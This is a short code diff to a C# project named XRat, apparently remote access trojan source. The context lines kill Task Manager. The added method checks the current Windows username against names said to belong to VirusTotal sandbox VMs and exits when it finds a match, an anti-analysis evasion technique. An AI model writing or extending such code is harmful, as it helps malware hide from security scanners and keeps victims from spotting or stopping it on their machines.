@@ -213,5 +213,18 @@ namespace XRat
             CMD(@"taskkill.exe /IM taskmgr.exe");
             return Task.CompletedTask;
         }
+
+        public static void CheckVirusTotal()
+        {
+            string[] virusTotalUsers = ["azure", "abby", "george", "bruno"];
+
+            string username = ProCMD("whoami").output;
+            username = username.Split('\\')[1];
+
+            if (virusTotalUsers.Contains(username)) 
+            {
+                Environment.Exit(0); // Leaving if it's VirusTotal VM
+            }
+        }
     }
 }
